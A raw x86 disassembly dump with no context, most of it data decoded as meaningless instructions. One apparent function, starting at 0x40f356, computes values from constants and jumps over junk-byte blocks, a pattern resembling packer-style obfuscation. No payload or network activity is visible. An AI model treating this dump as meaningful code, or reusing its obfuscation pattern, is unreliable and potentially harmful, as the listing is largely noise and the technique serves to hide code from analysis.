  40efc7:	icebp  
  40efc8:	lds    esi,FWORD PTR [ebx-0xf]
  40efcb:	call   DWORD PTR [edi+0x10]
  40efce:	adc    BYTE PTR [ebx+0x39],bh
  40efd1:	inc    ecx
  40efd2:	jp     0x40eff6
  40efd4:	cmp    BYTE PTR [edx],cl
  40efd6:	pop    ecx
  40efd7:	outs   dx,BYTE PTR ds:[esi]
  40efd8:	shr    ch,cl
  40efda:	test   al,0xb1
  40efdc:	imul   ebp,esi,0x333b2bf5
  40efe2:	jge    0x40efa4
  40efe4:	repz rol DWORD PTR ds:0xb4bdf23a,cl
  40efeb:	pop    edi
  40efec:	cmc    
  40efed:	push   0x20
  40efef:	push   ebx
  40eff0:	add    edx,esi
  40eff2:	adc    eax,0x2490f4f9
  40eff7:	dec    ecx
  40eff8:	jmp    0xeca0547d
  40effd:	lods   eax,DWORD PTR ds:[esi]
  40effe:	mov    al,ds:0x432ae5e7
  40f003:	mov    WORD PTR [ecx],cs
  40f005:	or     edx,edi
  40f007:	icebp  
  40f008:	ficomp DWORD PTR [ebx+0x39]
  40f00b:	aam    0x1a
  40f00d:	stc    
  40f00e:	ret    
  40f00f:	mov    ebp,0x6ee98532
  40f014:	cli    
  40f015:	mov    DWORD PTR [ecx],edi
  40f017:	test   BYTE PTR [ecx],ch
  40f019:	arpl   WORD PTR [eax+esi*2],bp
  40f01c:	mov    ds:0x60d533ee,al
  40f021:	enter  0x7f28,0xda
  40f025:	cpuid  
  40f027:	xchg   edi,eax
  40f028:	cmp    BYTE PTR [ebx-0xf],dl
  40f02b:	and    cl,al
  40f02d:	enter  0x5d65,0xa5
  40f031:	push   ebp
  40f032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f033:	cmp    ecx,eax
  40f035:	mov    ds:0x87805906,eax
  40f03a:	xchg   edi,eax
  40f03b:	and    al,0x11
  40f03d:	mov    ds:0x52e98fd6,eax
  40f042:	inc    esp
  40f043:	cmp    ebx,ebx
  40f045:	push   ss
  40f046:	dec    esi
  40f047:	shl    DWORD PTR [ecx-0x41dc6764],cl
  40f04d:	outs   dx,BYTE PTR ds:[esi]
  40f04e:	and    eax,0xf455df9d
  40f053:	push   edi
  40f054:	dec    ebx
  40f055:	mov    esi,0x6579d84c
  40f05a:	jg     0x40f0bd
  40f05c:	test   DWORD PTR [edx],0xcfc6a590
  40f062:	and    BYTE PTR [ebx+0x489aeecd],0x7f
  40f069:	inc    edx
  40f06a:	cmc    
  40f06b:	sbb    esi,DWORD PTR [ebp-0x748c6556]
  40f071:	mov    eax,0x50a33513
  40f076:	xchg   BYTE PTR [edx],ah
  40f078:	sbb    al,0xf4
  40f07a:	cmp    bh,BYTE PTR [eax+0x6e]
  40f07d:	sti    
  40f07e:	aaa    
  40f07f:	in     al,0xfa
  40f081:	aas    
  40f082:	fwait
  40f083:	rcr    BYTE PTR [edi+0xf],cl
  40f086:	test   DWORD PTR [eax],ecx
  40f088:	idiv   edi
  40f08a:	call   FWORD PTR [edi-0x17]
  40f08d:	mov    edi,0x47000002
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0x56e0:0xaa146552
  40f09f:	pop    ebx
  40f0a0:	jo     0x40f112
  40f0a2:	scas   al,BYTE PTR es:[edi]
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [esi-0x17],bl
  40f0ab:	daa    
  40f0ac:	cs or  dh,cl
  40f0af:	jp     0x40f0e2
  40f0b1:	(bad)  
  40f0b2:	(bad)  
  40f0b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0b4:	mov    ebx,0x84382f68
  40f0b9:	or     dh,bl
  40f0bb:	push   0x50
  40f0bd:	mov    ?,edx
  40f0bf:	enter  0x912c,0x47
  40f0c3:	lds    ebx,FWORD PTR [esi-0x1c]
  40f0c6:	test   eax,0xc7e09baa
  40f0cb:	pop    edi
  40f0cc:	cmc    
  40f0cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0ce:	popf   
  40f0cf:	shr    bl,1
  40f0d1:	cld    
  40f0d2:	inc    esi
  40f0d3:	(bad)  
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	adc    al,0x1
  40f0d7:	and    DWORD PTR [ebp-0x11172704],edi
  40f0dd:	push   0x1f0902d7
  40f0e2:	retf   
  40f0e3:	mov    esi,0xba01dc0b
  40f0e8:	push   ds
  40f0e9:	lods   eax,DWORD PTR ds:[esi]
  40f0ea:	sbb    al,BYTE PTR [ebx-0x2dd5913e]
  40f0f0:	pop    ecx
  40f0f1:	fs mov ebx,0x8d7d0d86
  40f0f8:	push   es
  40f0f9:	test   ah,dl
  40f0fb:	cld    
  40f0fc:	ret    
  40f0fd:	pop    esp
  40f0fe:	pushf  
  40f0ff:	lea    ecx,[eax-0x12c14e37]
  40f105:	push   eax
  40f106:	lods   eax,DWORD PTR ds:[esi]
  40f107:	aas    
  40f108:	mov    DWORD PTR [ebp+0x2b],ebp
  40f10b:	cwde   
  40f10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f10d:	cmp    DWORD PTR [ecx-0xe],0x4
  40f111:	sbb    ebp,DWORD PTR [edx+0x2894ac63]
  40f117:	in     al,0xa7
  40f119:	retf   
  40f11a:	sbb    dh,BYTE PTR [edi-0x4a]
  40f11d:	int3   
  40f11e:	xchg   esp,eax
  40f11f:	mov    eax,0x7c8ff5bf
  40f124:	inc    ecx
  40f125:	jp     0x40f130
  40f127:	push   ebp
  40f128:	mov    al,ds:0xdf135279
  40f12d:	inc    dx
  40f12f:	into   
  40f130:	and    DWORD PTR [eax+edi*1-0x33cea563],0x5d625676
  40f13b:	repnz mov cl,0x72
  40f13e:	leave  
  40f13f:	scas   eax,DWORD PTR es:[edi]
  40f140:	mov    esp,0x6a764c54
  40f145:	dec    edx
  40f146:	xchg   ebp,eax
  40f147:	mul    DWORD PTR [ecx-0x3]
  40f14a:	mov    bh,0xa0
  40f14c:	and    ebp,DWORD PTR [ecx-0x4f5e3089]
  40f152:	jmp    0xbafb:0xd0d049ad
  40f159:	cmp    eax,0x562b6f07
  40f15e:	rol    BYTE PTR [esi],1
  40f160:	or     eax,0xd3f38906
  40f165:	mov    esp,0x8cc25f5f
  40f16a:	cmp    ecx,DWORD PTR [ecx+0x22bc4425]
  40f170:	loopne 0x40f147
  40f172:	push   es
  40f173:	pop    ebp
  40f174:	jnp    0x40f14f
  40f176:	dec    esp
  40f177:	mov    esi,0x14763dc5
  40f17c:	imul   edi,DWORD PTR [edx+0x2631af92],0x7d
  40f183:	or     DWORD PTR [ebp-0x53f3f5a8],ecx
  40f189:	mov    WORD PTR [ecx],cs
  40f18b:	xchg   ecx,eax
  40f18c:	adc    al,BYTE PTR [edx]
  40f18e:	fcom   DWORD PTR [eax-0x9]
  40f191:	pushf  
  40f192:	push   esi
  40f193:	aad    0xce
  40f195:	mov    cs,WORD PTR [ebp-0x5e]
  40f198:	push   cs
  40f199:	in     eax,dx
  40f19a:	lods   al,BYTE PTR ds:[esi]
  40f19b:	xlat   BYTE PTR ds:[ebx]
  40f19c:	sbb    ah,0xd
  40f19f:	aas    
  40f1a0:	mov    ds:0xd3a568c6,al
  40f1a5:	mov    bh,BYTE PTR [edx+0x4ded0e34]
  40f1ab:	fcomp  DWORD PTR [ebp+0x48]
  40f1ae:	sub    DWORD PTR [ebx+0x5674cf1e],0xffffffdb
  40f1b5:	cld    
  40f1b6:	pop    esi
  40f1b7:	push   es
  40f1b8:	dec    edx
  40f1b9:	adc    bl,bh
  40f1bb:	nop
  40f1bc:	push   esi
  40f1bd:	mov    ecx,0x5d4b728b
  40f1c2:	inc    ebx
  40f1c3:	stos   BYTE PTR es:[edi],al
  40f1c4:	data16 jo 0x40f19c
  40f1c7:	js     0xedcb3aed
  40f1cd:	push   esp
  40f1ce:	int3   
  40f1cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1d0:	dec    eax
  40f1d1:	and    dh,BYTE PTR [ecx-0x1732c4e5]
  40f1d7:	loop   0x40f1c1
  40f1d9:	cmp    edx,0x72
  40f1dc:	adc    al,0xa
  40f1de:	pop    ebx
  40f1df:	pop    edx
  40f1e0:	cld    
  40f1e1:	test   DWORD PTR [ebx+0xe],edx
  40f1e4:	push   0xacea1861
  40f1e9:	mov    fs,WORD PTR [eax]
  40f1eb:	pop    edx
  40f1ec:	fild   WORD PTR [esi+0x18c619c0]
  40f1f2:	call   0xce46:0x3ab86c42
  40f1f9:	jg     0x40f229
  40f1fb:	inc    esi
  40f1fc:	dec    esi
  40f1fd:	add    BYTE PTR [ebx+0x2e],bl
  40f200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f201:	ss push es
  40f203:	push   ecx
  40f204:	or     eax,0x25e65f0a
  40f209:	inc    edi
  40f20a:	lods   eax,DWORD PTR ds:[esi]
  40f20b:	std    
  40f20c:	add    BYTE PTR [edi+ecx*4+0x48],ch
  40f210:	idiv   ebp
  40f212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f213:	(bad)  
  40f214:	ins    BYTE PTR es:[edi],dx
  40f215:	xor    ebp,edx
  40f217:	xor    esi,eax
  40f219:	cdq    
  40f21a:	jl     0x40f200
  40f21c:	push   ss
  40f21d:	stos   BYTE PTR es:[edi],al
  40f21e:	outs   dx,DWORD PTR ds:[esi]
  40f21f:	shr    BYTE PTR [ecx-0x6e944d18],1
  40f225:	pusha  
  40f226:	fnstenv [ebx-0x12321638]
  40f22c:	sbb    ch,0x84
  40f22f:	popf   
  40f230:	mov    eax,ds:0x99d3f81b
  40f235:	call   0x39c0:0x4a5ea402
  40f23c:	ins    BYTE PTR es:[edi],dx
  40f23d:	jnp    0x40f1ff
  40f23f:	ss cmp eax,0xf20e261b
  40f245:	push   cs
  40f246:	fnstenv [edi+0x25b99149]
  40f24c:	fwait
  40f24d:	adc    al,0x8
  40f24f:	jp     0x40f222
  40f251:	lds    edi,FWORD PTR [edi]
  40f253:	cmp    BYTE PTR [edx],0x59
  40f256:	ins    DWORD PTR es:[edi],dx
  40f257:	into   
  40f258:	into   
  40f259:	fld    TBYTE PTR [edx-0x65]
  40f25c:	xlat   BYTE PTR ds:[ebx]
  40f25d:	int3   
  40f25e:	xlat   BYTE PTR ds:[ebx]
  40f25f:	sub    al,ah
  40f261:	dec    ebx
  40f262:	mov    al,ds:0xa8773ccf
  40f267:	sub    DWORD PTR [ebx-0x5d],edx
  40f26a:	mov    ecx,0x57915dc9
  40f26f:	xor    ebp,DWORD PTR [esi+0x78e1991]
  40f275:	add    eax,0x80078dea
  40f27a:	test   bh,bh
  40f27c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f27d:	retf   
  40f27e:	stc    
  40f27f:	mov    bl,0xf9
  40f281:	add    ch,BYTE PTR [esi-0x3f]
  40f284:	icebp  
  40f285:	imul   ebx,ecx,0x8e15fa43
  40f28b:	jae    0x40f302
  40f28d:	xchg   BYTE PTR [edi+ebp*4-0x58badbf],ch
  40f294:	xor    eax,0x4d6413dc
  40f299:	ret    0xd69f
  40f29c:	out    0xeb,al
  40f29e:	sub    eax,0x6dcb6259
  40f2a3:	mul    dl
  40f2a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2a6:	sbb    BYTE PTR [ecx+0x9407cfc],0xb6
  40f2ad:	and    DWORD PTR [ecx+0x2235901d],0x92079b7c
  40f2b7:	shl    dx,0xe5
  40f2bb:	add    al,BYTE PTR [esi+0x6e]
  40f2be:	xchg   esp,eax
  40f2bf:	mov    BYTE PTR [ebp+0x481a86ca],bh
  40f2c5:	js     0x40f27f
  40f2c7:	push   0xffffff90
  40f2c9:	xor    esi,ecx
  40f2cb:	cli    
  40f2cc:	stos   DWORD PTR es:[edi],eax
  40f2cd:	and    ebp,DWORD PTR [edx]
  40f2cf:	fnstsw WORD PTR [ebp+0x18]
  40f2d2:	ja     0x40f2af
  40f2d4:	dec    ecx
  40f2d5:	push   0xfbccb70f
  40f2da:	jmp    0xa6af:0xd0c4b19b
  40f2e1:	fincstp 
  40f2e3:	cmp    dl,BYTE PTR [edi+0x315edc63]
  40f2e9:	scas   al,BYTE PTR es:[edi]
  40f2ea:	sahf   
  40f2eb:	mov    eax,ds:0xda6bfcfa
  40f2f0:	jns    0x40f302
  40f2f2:	ds pusha 
  40f2f4:	ret    
  40f2f5:	cld    
  40f2f6:	cmp    esi,DWORD PTR [ecx*8+0x107f947c]
  40f2fd:	jmp    0x886b2115
  40f302:	shl    bl,0x78
  40f305:	cmp    BYTE PTR [edi],cl
  40f307:	dec    esi
  40f308:	sahf   
  40f309:	mov    ebx,0x832215eb
  40f30e:	xchg   DWORD PTR [esi+edi*4],esi
  40f311:	dec    edi
  40f312:	(bad)  [esi]
  40f314:	and    esi,DWORD PTR [ebx+0x58]
  40f317:	cmp    cl,al
  40f319:	sub    al,BYTE PTR [ecx-0xf]
  40f31c:	xchg   edx,eax
  40f31d:	jl     0x40f32d
  40f31f:	sahf   
  40f320:	cmp    ch,BYTE PTR [ebp-0x44]
  40f323:	or     eax,0x5751e0c6
  40f328:	push   0x3d56b5b1
  40f32d:	scas   al,BYTE PTR es:[edi]
  40f32e:	int3   
  40f32f:	xchg   edi,eax
  40f330:	sub    edi,DWORD PTR [edi]
  40f332:	jecxz  0x40f343
  40f334:	sahf   
  40f335:	mov    ebp,0x60df2f84
  40f33a:	xchg   ecx,eax
  40f33b:	dec    ebp
  40f33c:	jmp    0x40f3a8
  40f33e:	xor    al,0x3a
  40f340:	loopne 0x40f2cf
  40f342:	sub    DWORD PTR ds:0x2d117d88,edi
  40f348:	xchg   ebp,eax
  40f349:	add    BYTE PTR [ecx+0x6186149e],dl
  40f34f:	sbb    BYTE PTR [esi+0x5b],0xc9
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0xfffffff9
  40f384:	or     DWORD PTR ds:0x18a82b6a,esi
  40f38a:	sbb    BYTE PTR [esi+0x3e181814],bh
  40f390:	mov    al,ds:0x16982680
  40f395:	adc    DWORD PTR [edx-0x624e232],esi
  40f39b:	bt     DWORD PTR [edx-0x5c],esi
  40f39f:	test   eax,0xba90c7f2
  40f3a4:	mov    ebp,0x1c82ecb3
  40f3a9:	fstp   st(0)
  40f3ab:	jno    0x40f353
  40f3ad:	add    esi,DWORD PTR [ebx]
  40f3af:	add    BYTE PTR [ecx+eax*8],dl
  40f3b2:	inc    edx
  40f3b3:	xchg   ebp,ecx
  40f3b5:	push   0xffffffc1
  40f3b7:	dec    edx
  40f3b8:	arpl   WORD PTR [edi+0x498dd888],cx
  40f3be:	push   ebx
  40f3bf:	push   eax
  40f3c0:	lods   eax,DWORD PTR ds:[esi]
  40f3c1:	xor    al,0x29
  40f3c3:	mov    al,0xb8
  40f3c5:	sti    
  40f3c6:	mov    ebx,0xe4628080
  40f3cb:	dec    ebx
  40f3cc:	or     al,dh
  40f3ce:	pop    ecx
  40f3cf:	push   esi
  40f3d0:	js     0x40f3ae
  40f3d2:	fisttp DWORD PTR [ecx+0x0]
  40f3d5:	test   BYTE PTR [ecx],0x4a
  40f3d8:	and    eax,0xace09cd
  40f3dd:	ins    BYTE PTR es:[edi],dx
  40f3de:	int    0x11
  40f3e0:	or     BYTE PTR [edi-0x74],dl
  40f3e3:	sub    DWORD PTR [edi-0x5defdb2],eax
  40f3e9:	inc    eax
  40f3ea:	loope  0x40f3fe
  40f3ec:	push   esi
  40f3ed:	cmp    eax,0xeba61dce
  40f3f2:	ret    
  40f3f3:	aad    0x61
  40f3f5:	or     eax,0xb4120791
  40f3fa:	scas   eax,DWORD PTR es:[edi]
  40f3fb:	fisub  WORD PTR [edx+0xe]
  40f3fe:	fucomp st(5)
  40f400:	and    eax,0xcd2dad53
  40f405:	push   ecx
  40f406:	jge    0x40f417
  40f408:	or     ebx,DWORD PTR [ebp+0x26]
  40f40b:	scas   eax,DWORD PTR es:[edi]
  40f40c:	in     eax,dx
  40f40d:	dec    edx
  40f40e:	pop    ecx
  40f40f:	rol    BYTE PTR [ecx+0x31],0x63
  40f413:	mov    al,ds:0xc2ac2c5f
  40f418:	cli    
  40f419:	push   cs
  40f41a:	inc    edi
  40f41b:	std    
  40f41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f41d:	mov    eax,ds:0x35d833f2
  40f422:	test   DWORD PTR [esi+edx*4-0x1d],0xf8695dd9
  40f42a:	adc    ah,BYTE PTR [esi-0x44]
  40f42d:	fbstp  TBYTE PTR [ecx]
  40f42f:	xor    al,0x66
  40f431:	mov    al,ds:0xdf016ee8
  40f436:	mov    ds:0x3fc3995d,eax
  40f43b:	test   DWORD PTR [ebp+0x71261a37],0x95666983
  40f445:	inc    ecx
  40f446:	shl    DWORD PTR [ebx+0x23],1
  40f449:	clc    
  40f44a:	outs   dx,BYTE PTR ds:[esi]
  40f44b:	shl    DWORD PTR [edi+0x97555e6],0x70
  40f452:	fmulp  st(6),st
  40f454:	das    
  40f455:	mov    BYTE PTR [edi-0x76],bh
  40f458:	jne    0x40f4b4
  40f45a:	dec    eax
  40f45b:	ja     0x40f43f
  40f45d:	adc    esi,DWORD PTR [ecx-0x40794aea]
  40f463:	inc    edi
  40f464:	inc    esp
  40f465:	stc    
  40f466:	adc    al,0x74
  40f468:	mov    eax,0xe8a9889a
  40f46d:	xchg   ebp,eax
  40f46e:	or     DWORD PTR [ebx+0x52],edi
  40f471:	jb     0x40f462
  40f473:	aaa    
  40f474:	lods   al,BYTE PTR ds:[esi]
  40f475:	loop   0x40f41b
  40f477:	leave  
  40f478:	enter  0x8ad1,0xe7
  40f47c:	repz daa 
  40f47e:	sar    DWORD PTR [ebx+eax*8+0x68],1
  40f482:	mov    dl,BYTE PTR [ecx+edi*8-0x7f6678bf]
  40f489:	mov    eax,ds:0xe18d0d5d
  40f48e:	idiv   DWORD PTR [ebp-0x29c43576]
  40f494:	mov    bl,0x5a
  40f496:	out    0x85,al
  40f498:	xchg   ah,bl
  40f49a:	and    al,0xb
  40f49c:	inc    eax
  40f49d:	or     BYTE PTR [ebx],0xff
  40f4a0:	(bad)  
  40f4a1:	dec    eax
  40f4a2:	push   edx
  40f4a3:	and    eax,0x150c3bdf
  40f4a8:	xor    ebp,DWORD PTR [esi-0x4b]
  40f4ab:	sbb    bh,BYTE PTR [ecx]
  40f4ad:	outs   dx,BYTE PTR ds:[esi]
  40f4ae:	push   esi
  40f4af:	pop    edx
  40f4b0:	cmp    BYTE PTR [ecx+0x27],dl
  40f4b3:	xchg   ecx,eax
  40f4b4:	inc    ebx
  40f4b5:	sbb    ebp,DWORD PTR [ebx+edi*4+0x295ef8b]
  40f4bc:	into   
  40f4bd:	mov    ds:0xea95c2ea,eax
  40f4c2:	sbb    cl,dl
  40f4c4:	push   esp
  40f4c5:	mov    ebp,0x8670b7ce
  40f4ca:	push   0xd89507b8
  40f4cf:	pop    esi
  40f4d0:	and    DWORD PTR [ecx],eax
  40f4d2:	sub    esp,DWORD PTR [eax]
  40f4d4:	and    dl,BYTE PTR [ebx-0x6d]
  40f4d7:	xor    ch,BYTE PTR [edx+edi*4]
  40f4da:	and    BYTE PTR [ebx+0x5ca77a58],0xf5
  40f4e1:	adc    DWORD PTR [eax],esi
  40f4e3:	cmc    
  40f4e4:	adc    al,BYTE PTR [ebp+0xa]
  40f4e7:	retf   
  40f4e8:	mov    esi,0xa00b9991
  40f4ed:	fs stos DWORD PTR es:[edi],eax
  40f4ef:	aaa    
  40f4f0:	mov    bh,BYTE PTR [ebx-0x69a2042c]
  40f4f6:	lods   eax,DWORD PTR ds:[esi]
  40f4f7:	retf   0x4ec0
  40f4fa:	push   ss
  40f4fb:	xchg   ecx,eax
  40f4fc:	cs pop ss
  40f4fe:	add    bh,BYTE PTR [edx+0x76]
  40f501:	sub    esp,DWORD PTR [edx-0x42690a51]
  40f507:	pop    edi
  40f508:	pop    es
  40f509:	inc    ecx
  40f50a:	test   eax,0xf066bd0f
  40f50f:	cmp    eax,0x11aad9ed
  40f514:	dec    ebp
  40f515:	and    bh,BYTE PTR [ebp-0x1c09494c]
  40f51b:	add    DWORD PTR [eax-0x66],ebx
  40f51e:	pusha  
  40f51f:	in     eax,0xa6
  40f521:	add    BYTE PTR [ebx-0x26],bl
  40f524:	jp     0x40f4ba
  40f526:	xchg   esp,eax
  40f527:	in     al,0x25
  40f529:	sbb    al,0xdf
  40f52b:	aam    0xa8
  40f52d:	push   ecx
  40f52e:	imul   eax,DWORD PTR [edx],0xffffffc7
  40f531:	and    BYTE PTR [edx],cl
  40f533:	test   eax,0x58bc62be
  40f538:	mov    al,ds:0xdcb04e0f
  40f53d:	mov    bh,BYTE PTR [edx-0x62]
  40f540:	mov    ch,0x32
  40f542:	push   ecx
  40f543:	and    DWORD PTR [esi+0x510b738e],ebp
  40f549:	inc    eax
  40f54a:	and    al,0x77
  40f54c:	sbb    eax,0xec6b9517
  40f551:	je     0x40f58a
  40f553:	(bad)  
  40f554:	test   eax,0x44745e2a
  40f559:	outs   dx,DWORD PTR ds:[esi]
  40f55a:	lods   eax,DWORD PTR ds:[esi]
  40f55b:	out    dx,al
  40f55c:	add    ebx,DWORD PTR [edi-0x41]
  40f55f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f560:	fdivr  st,st(3)
  40f562:	neg    DWORD PTR [ecx-0x16]
  40f565:	mov    WORD PTR ds:0x2e255857,cs
  40f56b:	pop    ebx
  40f56c:	inc    eax
  40f56d:	jg     0x40f52e
  40f56f:	iret   
  40f570:	cmp    DWORD PTR [edi+0xd50e1b2],0xbd5cc843
  40f57a:	dec    ecx
  40f57b:	arpl   WORD PTR [eax+0x333f4129],ax
  40f581:	pop    edx
  40f582:	ret    
  40f583:	in     al,dx
  40f584:	rcr    DWORD PTR [esi+0x7ee80bd8],cl
  40f58a:	mov    ds:0xe2ded700,eax
  40f58f:	neg    DWORD PTR [ebx-0x7db1b32e]
  40f595:	mov    ecx,0xa7f3687d
  40f59a:	fld    TBYTE PTR [ebp+0x25]
  40f59d:	pop    ebx
  40f59e:	sbb    dl,cl
  40f5a0:	push   ecx
  40f5a1:	lds    ebx,FWORD PTR [eax+0x78]
  40f5a4:	addr16 out 0x65,al
  40f5a7:	and    eax,0x2e2444f4
  40f5ac:	or     eax,0xc9446922
  40f5b1:	mov    ecx,0xc5b3a7e
  40f5b6:	mov    al,0xbe
  40f5b8:	in     eax,0x90
  40f5ba:	xchg   ecx,eax
  40f5bb:	rcr    BYTE PTR [esp+edi*4-0x3ec95eb3],0x83
  40f5c3:	pop    esp
  40f5c4:	add    ah,BYTE PTR [edi+0x77]
  40f5c7:	in     al,dx
  40f5c8:	mov    dh,0x41
  40f5ca:	out    dx,al
  40f5cb:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5cd:	jmp    0x7a4fc444
  40f5d2:	add    DWORD PTR [esi],0xf01dc764
  40f5d8:	outs   dx,DWORD PTR ds:[esi]
  40f5d9:	dec    eax
  40f5da:	in     al,dx
  40f5db:	pop    ebp
  40f5dc:	xchg   ecx,eax
  40f5dd:	sub    bh,BYTE PTR [ebx+0x37]
  40f5e0:	sbb    al,0xfa
  40f5e2:	push   esi
  40f5e3:	sub    BYTE PTR [ecx+eiz*8+0x6],ch
  40f5e7:	pop    ecx
  40f5e8:	pmullw mm4,mm3
  40f5eb:	mov    eax,0xf8c6991
  40f5f0:	inc    ebx
  40f5f1:	mov    ebp,0xb1530e25
  40f5f6:	fcmovu st,st(7)
  40f5f8:	mov    ecx,0xa256a5d2
  40f5fd:	adc    edi,DWORD PTR [eax-0x20525738]
  40f603:	dec    ebx
  40f604:	mov    bh,0xa6
  40f606:	leave  
  40f607:	into   
  40f608:	sahf   
  40f609:	mov    WORD PTR [edi+0x1deb943b],?
  40f60f:	outs   dx,DWORD PTR ds:[esi]
  40f610:	fnsave [ebp+0x2a]
  40f613:	mov    ah,0xe6
  40f615:	or     BYTE PTR [ebx],dh
  40f617:	into   
  40f618:	mov    al,0x46
  40f61a:	adc    DWORD PTR [edi-0x7d],eax
  40f61d:	cmp    esp,DWORD PTR [ebp+0xa]
  40f620:	push   eax
  40f621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f622:	inc    esi
  40f623:	inc    edx
  40f624:	jne    0x40f5dc
  40f626:	repnz test edi,ebx
  40f629:	add    ch,bh
  40f62b:	not    BYTE PTR [eax-0x24]
  40f62e:	das    
  40f62f:	nop
  40f630:	mov    cl,0xe0
  40f632:	mov    eax,ds:0xaeb1304a
  40f637:	fiadd  WORD PTR [esi-0x14cd2061]
  40f63d:	inc    ecx
  40f63e:	dec    esp
  40f63f:	mov    ecx,0x5f84d8b
  40f644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f645:	sbb    al,0x0
  40f647:	add    BYTE PTR [ebx],cl
  40f649:	ror    DWORD PTR [ebx+0x4225180d],0x0
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x42264c
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx-0x435cb460],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	popa   
  40f732:	sbb    BYTE PTR [edx-0x1f],al
  40f735:	sub    al,cl
  40f737:	pop    es
  40f738:	and    al,ch
  40f73a:	icebp  
  40f73b:	push   ebx
  40f73c:	dec    eax
  40f73d:	fild   WORD PTR [edi+0x0]
  40f740:	add    DWORD PTR fs:[edi],ebp
  40f743:	popf   
  40f744:	cmp    DWORD PTR [esi+0x1c8d82a2],esi
  40f74a:	sbb    ebp,esi
  40f74c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f74d:	imul   esi,DWORD PTR [eax],0x25
  40f750:	not    eax
  40f752:	loop   0x40f7c7
  40f754:	int    0x36
  40f756:	pushf  
  40f757:	mov    ecx,0xc70ada3f
  40f75c:	lahf   
  40f75d:	shl    edi,0x2
  40f760:	push   es
  40f761:	adc    BYTE PTR [esi],0xfe
  40f764:	pop    ebp
  40f765:	jnp    0x40f70e
  40f767:	loope  0x40f725
  40f769:	ins    DWORD PTR es:[edi],dx
  40f76a:	lds    ecx,FWORD PTR [esi+0x6313f36f]
  40f770:	adc    al,0x30
  40f772:	jae    0x40f75c
  40f774:	push   0x663910be
  40f779:	push   esp
  40f77a:	pop    ebp
  40f77b:	pop    ebp
  40f77c:	call   0x74509b2c
  40f781:	mov    ebp,0x20a43ced
